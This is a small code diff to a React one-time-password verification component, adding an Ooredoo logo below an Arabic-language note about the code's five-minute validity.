@@ -95,6 +95,10 @@ const OTPVerification = () => {
                   <strong>ملاحظة هامة:</strong> رمز التحقق صالح لمدة 5 دقائق فقط. في حال انتهاء صلاحية الرمز، يرجى طلب إرسال رمز جديد.
                 </p>
               </div>
+              
+              <div className="flex justify-center mt-6">
+                <img src={ooredooLogo} alt="Ooredoo" className="h-10" />
+              </div>
             </div>
 
             <div className="flex gap-3 flex-row-reverse">
